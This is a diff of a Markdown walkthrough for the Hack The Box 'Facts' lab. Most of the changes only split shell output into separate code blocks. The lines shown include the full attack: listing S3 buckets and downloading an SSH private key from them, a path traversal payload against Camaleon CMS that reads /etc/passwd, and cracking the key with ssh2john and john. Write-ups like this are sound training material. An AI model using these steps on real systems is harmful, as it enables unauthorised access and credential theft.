@@ -73,8 +73,8 @@ s3 credentials help us futher enumerate the s3 buckets for more hidden informati
 └─# aws --endpoint-url http://facts.htb:54321 s3 ls                    
 2025-09-11 21:06:52 internal
 2025-09-11 21:06:52 randomfacts
-
-
+```
+```
 ┌──(root㉿kali-linux-2024-2)-[/home/parallels/Documents/FactsHTB]
 └─# aws --endpoint-url http://facts.htb:54321 s3 ls s3://internal/.ssh/
 2026-04-16 15:47:07         82 authorized_keys
@@ -87,7 +87,8 @@ The s3 bucket `internal` contains an ssh key named `id_ed25519`. We can download
 ┌──(root㉿kali-linux-2024-2)-[/home/parallels/Documents/FactsHTB/CVE-2025-2304]
 └─# aws --endpoint-url http://facts.htb:54321 s3 cp s3://internal/.ssh/id_ed25519 ./id_ed25519  
 download: s3://internal/.ssh/id_ed25519 to ./id_ed25519             
-
+```
+```
 ┌──(root㉿kali-linux-2024-2)-[/home/parallels/Documents/FactsHTB]
 └─#cat id_ed25519            
 -----BEGIN OPENSSH PRIVATE KEY-----
@@ -103,7 +104,8 @@ Following a link rabbit hole takes us to [`owen2345 camaleon-cms Github`](https:
 
 ```
 http://facts.htb/admin/media/download_private_file?file=../../../../../../etc/passwd
-
+```
+```
 ┌──(root㉿kali-linux-2024-2)-[/home/parallels/Documents/FactsHTB]
 └─# cat passwd                       
 root:x:0:0:root:/root:/bin/bash
@@ -151,8 +153,9 @@ We could try both users but it's better practice to first meet some prerequisite
 
 ```
 ┌──(root㉿kali-linux-2024-2)-[/home/parallels/Documents/FactsHTB/CVE-2025-2304]
-└─# ssh2john ./id_ed25519 > hash.txt    
-                                                                      
+└─# ssh2john ./id_ed25519 > hash.txt
+```    
+```                                                                  
 ┌──(root㉿kali-linux-2024-2)-[/home/parallels/Documents/FactsHTB/CVE-2025-2304]
 └─# john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
 Using default input encoding: UTF-8
